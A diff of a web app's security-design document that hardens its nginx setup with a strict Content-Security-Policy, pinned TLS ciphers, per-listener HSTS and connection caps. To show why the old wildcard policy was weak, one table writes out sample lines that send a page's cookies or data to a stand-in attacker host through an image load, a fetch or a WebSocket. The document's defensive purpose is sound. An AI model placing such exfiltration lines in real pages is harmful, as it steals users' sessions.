@@ -4,8 +4,9 @@ What the app does to protect itself, and what each measure defends against. The 
 the network edge inward: exposure, transport, edge headers, rate limits, sessions, tokens, the game
 engine boundary, input handling, and secrets.
 
-In short: nginx is the only public entry point (TLS 1.2/1.3 only, security headers, per-IP rate
-limits) and it fronts a loopback-only backend, engine, database and cache. Sessions use httpOnly
+In short: nginx is the only public entry point (TLS 1.2/1.3 with a pinned cipher list, a strict
+Content-Security-Policy and the other security headers, per-IP rate and connection limits) and it
+fronts a loopback-only backend, engine, database and cache. Sessions use httpOnly
 cookies with rotating refresh tokens, passwords are bcrypt-hashed, every emailed token is single
 use and stored only as a hash, and the game engine verifies its own signed token before a socket can
 join a room.
@@ -23,9 +24,9 @@ Verified against the current repo: `compose.yaml`, `nginx/conf/nginx.conf`, `ngi
 ## Table of Contents
 
 - [Network exposure](#network-exposure): the one port reachable from another machine, and why the rest are loopback-only
-- [Transport security (TLS)](#transport-security-tls): TLS 1.2/1.3 on both listeners, HSTS, and the self-signed certificate
-- [Edge headers and static content](#edge-headers-and-static-content): the headers both listeners set, and the static-file rules
-- [Rate limiting](#rate-limiting): the nginx per-address zones, the address each listener trusts, and the API throttler
+- [Transport security (TLS)](#transport-security-tls): TLS 1.2/1.3 and the pinned cipher list on both listeners, HSTS, and the self-signed certificate
+- [Edge headers and static content](#edge-headers-and-static-content): the headers both listeners set, the strict CSP, and the static-file rules
+- [Rate limiting](#rate-limiting): the nginx per-address zones and connection caps, the address each listener trusts, and the API throttler
 - [Sessions and authentication](#sessions-and-authentication): cookie shape, token lifetimes, rotation and revocation, bcrypt, 2FA
 - [Emailed link tokens](#emailed-link-tokens): what the app emails, each token's lifetime, and the single-use rule
 - [Emailed links cannot reach a log](#emailed-links-cannot-reach-a-log): why an emailed token never reaches a proxy access log
@@ -71,17 +72,28 @@ application-level authentication being reachable from the network.
 
 - Both listeners serve **TLS 1.2 and TLS 1.3 only** (`ssl_protocols TLSv1.2 TLSv1.3`). SSLv3, TLS 1.0
   and TLS 1.1 are refused.
+- **The TLS 1.2 cipher list is pinned** (`ssl_ciphers`, in the shared `http` block so the two
+  listeners cannot drift) to six ECDHE suites that all use an AEAD cipher: AES-GCM or
+  ChaCha20-Poly1305. **Session tickets are off** (`ssl_session_tickets off`), so a captured ticket key
+  cannot decrypt recorded sessions, and `ssl_prefer_server_ciphers off` leaves the choice to the
+  client, which on any current browser is that same ECDHE set. TLS 1.3 fixes its own ciphersuites and
+  is unaffected. See [What changed, file by file](#what-changed-file-by-file) for what the default
+  list left open.
 - nginx has **no plain-HTTP listener**. Both `server {}` blocks use `listen ... ssl`, and the only
   published nginx ports are `443` and `444`.
-- Every response carries `Strict-Transport-Security: max-age=31536000; includeSubDomains`, so a
-  browser that has seen the app once keeps using HTTPS for it.
+- **HSTS is set per listener, and only one of them pins subdomains.** The direct listener sends
+  `Strict-Transport-Security: max-age=31536000; includeSubDomains`, so a browser that has seen the app
+  once keeps using HTTPS for that host and everything under it. The tunnel listener sends the bare
+  `max-age=31536000`: its public host is an ngrok subdomain, so `includeSubDomains` there would claim
+  authority over a domain we do not own while protecting nothing of ours.
 - The certificate is self-signed and generated at image build time (`nginx/Dockerfile`, `openssl req
   -x509 -days 365`, CN `transcendence-ludo`). This is why the first visit shows a browser warning.
 - `make tunnel` points ngrok at `https://localhost:$(NGROK_PORT)`, so the agent speaks TLS to nginx
   instead of forwarding plain HTTP at a TLS-only port. The visitor's connection to ngrok is TLS too.
 
-**Mitigates:** downgrade to a broken TLS version, passive interception of credentials or session
-cookies on the network, and plaintext capture of the first request.
+**Mitigates:** downgrade to a broken TLS version or to a weak, non-forward-secret cipher suite,
+decryption of recorded sessions from a captured ticket key, passive interception of credentials or
+session cookies on the network, and plaintext capture of the first request.
 
 
 ---
@@ -96,9 +108,41 @@ cookies on the network, and plaintext capture of the first request.
 | `X-Frame-Options` | `SAMEORIGIN` | clickjacking, where another site frames the app and overlays it |
 | `X-Content-Type-Options` | `nosniff` | MIME sniffing, where a stored file is interpreted as a script |
 | `Referrer-Policy` | `strict-origin-when-cross-origin` | leaking full URLs, and any path or query data in them, to third-party sites |
-| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains` | protocol downgrade and cookie theft over plain HTTP |
-| `Content-Security-Policy` | `default-src 'self'` and an explicit source list | content from an origin that was not declared in the policy |
-| `X-XSS-Protection` | `1; mode=block` | the legacy XSS filter in older browser engines |
+| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains` on the direct listener, bare `max-age=31536000` on the tunnel listener | protocol downgrade and cookie theft over plain HTTP, without claiming subdomains of a domain we do not own (see [Transport security](#transport-security-tls)) |
+| `Content-Security-Policy` | the explicit policy below, with no wildcards | anything the policy does not name: an inline script, an external script, or an image or a fetch to a foreign origin |
+| `Permissions-Policy` | `geolocation=(), camera=(), microphone=()` | the page, or any script that later runs in it, asking the browser for a location, a camera or a microphone. The app uses none of the three, so the header removes the capability instead of relying on a prompt |
+
+### The Content-Security-Policy
+
+```
+default-src 'self';
+script-src  'self';
+style-src   'self' 'unsafe-inline' https://fonts.googleapis.com https://cdnjs.cloudflare.com;
+font-src    'self' data: https://fonts.gstatic.com https://cdnjs.cloudflare.com https://assets.codepen.io;
+img-src     'self' data:;
+connect-src 'self';
+object-src  'none';
+base-uri    'self';
+frame-ancestors 'self';
+form-action 'self';
+upgrade-insecure-requests;
+```
+
+- `script-src 'self'` is the load-bearing directive: it is what makes a single injection point
+  non-exploitable, because there is no inline script for an injected payload to ride on.
+- `style-src` keeps `'unsafe-inline'` deliberately. React inline `style` attributes and Tailwind
+  require it, and a style cannot execute script. The two third-party origins are the Google Fonts and
+  FontAwesome stylesheets the SPA loads.
+- `font-src` keeps the same origins for the font files themselves, plus `data:` for the icons bundled
+  into the build.
+- `object-src 'none'` removes `<object>`, `<embed>` and legacy plugin content, which nothing in the
+  app uses and which `script-src` does not always govern.
+- `base-uri 'self'` stops an injected `<base href>` from re-pointing every relative URL on the page at
+  another origin.
+- `frame-ancestors 'self'` is the CSP-level form of `X-Frame-Options`, and is enforced by browsers
+  that ignore the older header.
+- `form-action 'self'` stops a form on the page from posting to another origin.
+- `upgrade-insecure-requests` rewrites any stray `http://` subresource request to `https://`.
 
 Additional edge behaviour:
 
@@ -107,14 +151,68 @@ Additional edge behaviour:
 - `server_tokens off` removes the nginx version from responses and error pages.
 - `location ~ /\.` denies hidden files (`.env`, `.git` and similar), with `access_log off` so a probe
   leaves no useful noise behind either.
-- `client_max_body_size 10M` bounds the request body at the edge.
+- `client_max_body_size 3M` bounds the request body at the edge. The largest legitimate body is a 2 MB
+  avatar upload, so this leaves room for multipart overhead and stays far below the previous `10M`.
+  nginx buffers a body up to the limit before the API can reject it, so headroom beyond that is
+  memory and disk a client can spend on requests that were always going to fail validation.
 
-The current policy still allows `'unsafe-inline'` script, and `img-src` and `connect-src` use
-wildcards, so CSP is a partial control rather than a complete one. See
-[Not yet addressed](#not-yet-addressed).
+### What changed, file by file
 
-**Mitigates:** clickjacking, MIME sniffing, referrer leakage, downgrade attacks, and a broad class
-of injected-resource attacks that a strict policy would block outright.
+The two files were hardened in different ways, so they are listed separately. `app.inc` carries what
+both listeners share; `nginx.conf` carries what is per listener or per connection, which is why the
+second pair of tables also covers transport and connection caps.
+
+#### `nginx/conf/app.inc`: removed
+
+| Removed | Why it was insufficient | Replaced by |
+|---|---|---|
+| `script-src 'self' 'unsafe-inline'` | `'unsafe-inline'` executes any inline `<script>`, any `onclick=` attribute and any injected `<img onerror=...>`, so the policy permitted exactly the payload it exists to stop | `script-src 'self'` |
+| `default-src 'self' 'unsafe-inline'` | `default-src` is the fallback for every fetch directive that is not named, so `'unsafe-inline'` leaked into `frame-src`, `media-src`, `worker-src` and the rest | `default-src 'self'` |
+| `img-src 'self' data: https:` | `https:` with no host accepts an image from any host on the internet, so `new Image().src = 'https://attacker/?' + document.cookie` exfiltrates as an image load and never touches `connect-src` | `img-src 'self' data:` |
+| `connect-src 'self' ws: wss:` | a scheme with no host matches every host using that scheme, so `fetch('https://attacker/')` and `new WebSocket('wss://attacker/')` were both allowed | `connect-src 'self'` |
+| `X-XSS-Protection: 1; mode=block` | the legacy reflection filter was removed from Chrome and never existed in Firefox, and where it remains it can itself introduce a vulnerability by rewriting a page. It sat behind the CSP and added nothing to it | nothing: `script-src 'self'` is the control that matters |
+| `Strict-Transport-Security` set once for both listeners | a single value cannot be correct for both, because the tunnel listener's public host is an ngrok subdomain, so `includeSubDomains` there claims a domain we do not own | two per-listener headers in `nginx.conf`, below |
+
+#### `nginx/conf/app.inc`: added
+
+| Added | What it defends against |
+|---|---|
+| `Permissions-Policy: geolocation=(), camera=(), microphone=()` | a page script asking for a location, a camera or a microphone. The app uses none of the three, so the capability is removed rather than left to a prompt a user could be talked into accepting |
+| `default-src 'self'` | every fetch directive the policy does not name, which now falls back to same-origin only |
+| `script-src 'self'` | injected script. The build has no inline script and the SPA uses no `eval`, `new Function` or `dangerouslySetInnerHTML`, so an injection point has nothing to execute |
+| `img-src 'self' data:` | image-based exfiltration, while still covering every image the app renders: same-origin avatars, bundled `data:` icons and the DiceBear `data:` fallback |
+| `connect-src 'self'` | scripted exfiltration and command-and-control channels, while leaving the same-origin Socket.IO connection working |
+| `object-src 'none'` | plugin content (`<object>`, `<embed>`), which nothing in the app uses and which `script-src` does not always govern |
+| `base-uri 'self'` | an injected `<base href>` re-pointing every relative URL on the page at another origin |
+| `frame-ancestors 'self'` | clickjacking, in the form browsers honour even when they ignore `X-Frame-Options` |
+| `form-action 'self'` | a form on the page posting to another origin |
+| `upgrade-insecure-requests` | a stray `http://` subresource request being fetched in the clear |
+
+#### `nginx/conf/nginx.conf`: removed
+
+| Removed | Why it was insufficient | Replaced by |
+|---|---|---|
+| `client_max_body_size 10M` | five times the largest legitimate body. nginx buffers a body up to the limit before the API can refuse it, so the extra room was memory and disk spent on requests that were always going to fail validation | `client_max_body_size 3M` |
+| one HSTS value for both listeners, inherited from `app.inc` | see the last row of the `app.inc` removal table above | the two per-listener HSTS headers below |
+
+#### `nginx/conf/nginx.conf`: added
+
+| Added | What it defends against |
+|---|---|
+| `Strict-Transport-Security: max-age=31536000; includeSubDomains` on the direct listener | protocol downgrade and cookie theft over plain HTTP, for our own host and its subdomains |
+| `Strict-Transport-Security: max-age=31536000` on the tunnel listener | the same for the ngrok host, without claiming subdomains of a domain we do not own |
+| `ssl_ciphers` (six ECDHE suites, all AEAD) with `ssl_prefer_server_ciphers off` | a downgrade attack that forces RSA key exchange, which has no forward secrecy, or a CBC suite, which has measurable padding weaknesses. Left at the build default, the strongest suite is optional rather than required. Rationale under [Transport security](#transport-security-tls) |
+| `ssl_session_tickets off` | decryption of recorded sessions from a single captured ticket key, which is the forward secrecy the ECDHE suites were chosen to give. Rationale under [Transport security](#transport-security-tls) |
+| `limit_conn_zone $binary_remote_addr zone=conn:10m` | nothing on its own: it is the bucket the two caps below count in |
+| `limit_conn_status 429` | a capped request answering nginx's default `503`, which clients retry while monitoring counts it as an outage |
+| `limit_conn conn 100` on the direct listener | one client holding connections open until worker connections run out. Every direct client shares one address behind Docker's NAT, so the value is deliberately high. See [Rate limiting](#rate-limiting) |
+| `limit_conn conn 30` on the tunnel listener | the same abuse from the internet, keyed on the real visitor recovered from `X-Forwarded-For`, so here it is a true per-visitor cap. See [Rate limiting](#rate-limiting) |
+| `client_max_body_size 3M` | a body large enough to spend the edge's memory and disk, while still leaving room for a 2 MB avatar plus its multipart overhead |
+
+**Mitigates:** clickjacking, MIME sniffing, referrer leakage, inline script execution from any
+injection point, data exfiltration through an image or a `fetch`, plugin content invoked through
+`<object>`, form redirection to a foreign origin, and a page script asking for a camera, a microphone
+or a location.
 
 
 ---
@@ -140,6 +238,24 @@ of injected-resource attacks that a strict policy would block outright.
   tighter zone matched never reaches the loose `api` zone.
 - The `api` zone is deliberately loose: one SPA page load fans out across several endpoints, so it is
   a ceiling on hammering rather than a usage quota.
+
+### Connection cap (nginx `limit_conn`)
+
+A rate limit bounds how fast requests arrive, not how many are open at once. A client that reads
+slowly, or that holds the notification SSE stream and the game socket open, passes every rate limit
+while holding server resources. Each listener therefore caps requests in flight per address as well:
+
+| Listener | Cap | Keyed on | Why this value |
+|---|---|---|---|
+| `8443` direct | `limit_conn conn 100` | the bridge address every direct client shares | Docker's NAT collapses all direct clients onto one address, so this is a shared ceiling rather than a per-client one. Set high on purpose: it bounds a runaway client without policing normal use. |
+| `8444` tunnel | `limit_conn conn 30` | the real visitor, resolved from `X-Forwarded-For` | On this path the address is genuinely per visitor, so this is a real per-visitor cap. A page plus a game socket and a notification stream uses a handful. |
+
+`limit_conn_status 429` answers a capped request with the same status as a throttled one, so a client
+gets a consistent signal instead of nginx's default `503`.
+
+**Mitigates:** one client, or one script, holding many connections open at once to exhaust worker
+connections or upstream sockets, including the slow-read case that a request rate limit does not
+cover.
 
 ### Which client address each listener trusts
 
@@ -386,16 +502,12 @@ They are listed so that this doc does not overstate the current state.
 
 | Area | Current state | Why it matters |
 |---|---|---|
-| Content Security Policy | `script-src 'self' 'unsafe-inline'`, with wildcard `img-src` and `connect-src` | inline script is allowed, so the policy does not stop an injected inline payload |
 | Engine socket | Socket.IO CORS defaults to `origin: '*'`; no event rate limit; the default 1 MB `maxHttpBufferSize` | a foreign origin can open a socket (it still needs a valid match token to join a game), and a connected socket can send large or rapid events |
 | Login lockout | throttling is per client address | attempts spread over many addresses are not slowed per account |
 | Engine shared key | `X-Engine-Key` is compared with a plain string comparison, and falls back to `dev-engine-key` when the variable is unset | the comparison is not constant time, and the fallback would let a misconfigured deployment accept a known key |
-| Request size | the edge allows 10 MB while avatars are limited to 2 MB | a large body is buffered before the API rejects it |
-| TLS tuning | default cipher list and session tickets | cipher preferences are whatever the nginx build ships with |
 | Schema push | the backend entrypoint runs `prisma db push --accept-data-loss` on every boot | an unintended schema drift could drop data unattended |
 | Notification streams | no cap on concurrent SSE streams per user | one signed-in user can hold many long-lived responses open |
 | Certificate | valid for 365 days, regenerated only at image build | an expired certificate is a warning, not a bypass, but it is a recurring support burden |
-| Connection cap | no `limit_conn` | there is a request rate limit but no limit on simultaneous connections per address |
 | `helmet()` | not used on the backend | nginx already sets the headers, so this is a duplicate-control gap only |
 
 
